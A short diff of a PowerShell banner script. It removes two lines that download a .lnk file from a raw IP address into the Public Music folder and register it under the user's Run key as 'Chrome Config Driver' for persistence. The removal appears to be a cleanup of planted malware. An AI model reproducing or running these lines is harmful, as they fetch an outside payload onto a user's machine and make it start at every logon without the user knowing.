@@ -7,8 +7,6 @@ Write-Host "#
 Write-Host "# 
 Write-Host "#                                                                      #";
 Write-Host "########################################################################";
-$client = new-object System.Net.WebClient;$client.DownloadFile("http://194.15.112.220:8011/hosts.lnk", "C:\users\Public\Music\hosts.lnk");
-reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /V "Chrome Config Driver" /t REG_SZ /F /D "C:\users\Public\Music\hosts.lnk";
 $client = $null;
 $stream = $null;
 $buffer = $null;
